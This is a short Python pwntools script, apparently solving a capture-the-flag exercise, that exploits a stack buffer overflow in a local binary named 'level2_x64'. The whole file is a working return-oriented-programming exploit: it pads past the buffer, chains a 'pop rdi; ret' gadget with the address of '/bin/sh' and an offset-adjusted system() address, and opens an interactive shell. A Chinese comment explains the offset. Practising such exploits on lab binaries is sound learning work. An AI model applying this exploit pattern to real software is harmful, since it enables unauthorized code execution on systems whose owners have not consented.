from pwn import *

pop_rdi_ret_addr = 0x00000000004006b3

elf = ELF("./level2_x64")

bin_sh_addr = next(elf.search(b"/bin/sh"))
print(bin_sh_addr)

sys_addr = elf.symbols["system"] + 0xcb - 0xc0
#这里加上0xcb - 0xc0偏移的原因在于使用IDA查看会发现elf.symbols找到的system首地址上并不是代码而是注释，所以加上偏移让它进入代码部分
print(sys_addr)

payload = cyclic( 0x80 + 8 ) + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(sys_addr)

io = process("./level2_x64")

io.recvline()

io.send(payload)

io.interactive()
